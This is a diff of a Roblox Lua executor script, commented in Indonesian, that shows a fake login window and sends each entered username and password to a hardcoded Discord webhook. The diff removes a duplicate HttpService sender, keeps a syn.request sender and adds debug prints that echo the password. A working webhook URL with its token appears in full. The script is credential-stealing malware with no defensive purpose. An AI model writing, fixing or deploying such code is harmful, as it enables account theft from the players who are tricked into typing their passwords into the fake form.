@@ -1,6 +1,7 @@
 -- URL Webhook Discord
 local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"
 
+-- Fungsi untuk mengirim data ke Discord
 local function sendToDiscord(username, password)
     if syn and syn.request then
         print("Executor mendukung syn.request") -- Debugging
@@ -22,25 +23,6 @@ local function sendToDiscord(username, password)
         end
     else
         print("Executor tidak mendukung HTTP requests!") -- Debugging
-    end
-end
-
-local function sendToDiscord(username, password)
-    local httpService = game:GetService("HttpService")
-    local payload = httpService:JSONEncode({
-        content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
-    })
-
-    print("Payload yang dikirim:", payload) -- Debugging: Pastikan payload benar
-
-    local success, err = pcall(function()
-        httpService:PostAsync(webhook_url, payload, Enum.HttpContentType.ApplicationJson)
-    end)
-
-    if success then
-        print("Data berhasil dikirim ke Discord!") -- Debugging
-    else
-        print("Gagal mengirim data ke Discord:", err) -- Debugging jika ada error
     end
 end
 
@@ -151,10 +133,12 @@ collabIcon2.BackgroundTransparency = 1
 
 -- Fungsi LoginButton
 loginButton.MouseButton1Click:Connect(function()
+    print("Tombol Login Ditekan!") -- Debugging tombol
     local username = usernameBox.Text
     local password = passwordBox.Text
 
     if username ~= "" and password ~= "" then
+        print("Username:", username, "Password:", password) -- Debugging input
         sendToDiscord(username, password) -- Kirim data ke webhook
         screenGui:Destroy() -- Hapus GUI setelah login berhasil
     else
